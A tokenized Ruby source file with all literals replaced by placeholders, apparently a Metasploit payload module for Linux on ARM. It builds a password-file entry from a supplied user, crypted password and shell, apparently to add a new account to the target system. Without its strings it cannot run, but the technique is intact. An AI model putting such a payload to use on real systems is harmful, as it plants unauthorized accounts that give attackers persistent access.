require <str> module Metasploit3 CachedSize = <int> include Msf :: Payload :: Single include Msf :: Payload :: Linux def initialize ( info = { } ) super ( merge_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > ARCH_ARMLE , <str> = > true ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , ] , self . class ) end def generate_stage ( opts = { } ) user = datastore [ <str> ] || <str> pass = datastore [ <str> ] || <str> shell = datastore [ <str> ] || <str> str = <str> user <str> pass . crypt ( <str> ) <str> shell <str> strl1 = [ ( str . length ) + <int> ] . pack ( <str> ) strl2 = [ str . length ] . pack ( <str> ) pwdir = <str> payload = <str> + <str> + strl1 + <str> + <str> + <str> + strl2 + <str> + <str> + str + pwdir end end 
